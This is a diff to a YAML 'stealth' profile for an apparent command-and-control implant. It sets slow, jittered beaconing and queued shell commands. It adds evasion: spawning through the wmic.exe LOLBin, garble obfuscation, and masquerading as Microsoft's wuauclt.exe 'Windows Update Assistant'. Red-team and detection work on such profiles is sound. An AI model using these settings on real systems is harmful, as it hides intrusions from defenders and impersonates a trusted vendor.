@@ -1,7 +1,7 @@
-# Stealth profile - slow beacon, full evasion, working-hours beaconing
-# WARNING: working_hours_only=true means agent only beacons 08:00-18:00 local time.
-# Shell commands typed outside those hours will queue but not execute until next window.
-# Set working_hours_only=false for 24/7 operation while keeping all other evasion.
+# Stealth profile — slow beacon, full evasion, 24/7 operation
+# WARNING: working_hours_only=true means agent only beacons 08:00-18:00.
+# Shell commands queued outside that window execute on the next beacon cycle.
+# Recommended shell timeout: --timeout 600
 name: stealth
 sleep_interval: 300s
 jitter_percent: 50
@@ -15,3 +15,14 @@ kill_date: ""
 working_hours_only: false
 working_hours_start: 8
 working_hours_end: 18
+
+# Level 1 evasion
+exec_method: wmi            # spawn via wmic.exe LOLBin — process parent = WMI host
+obfuscate: true             # requires garble: go install mvdan.cc/garble@latest
+masquerade:
+  enabled: true
+  company: "Microsoft Corporation"
+  product: "Windows Update"
+  description: "Windows Update Assistant"
+  original_filename: "wuauclt.exe"
+  version: "10.0.19041.1866"
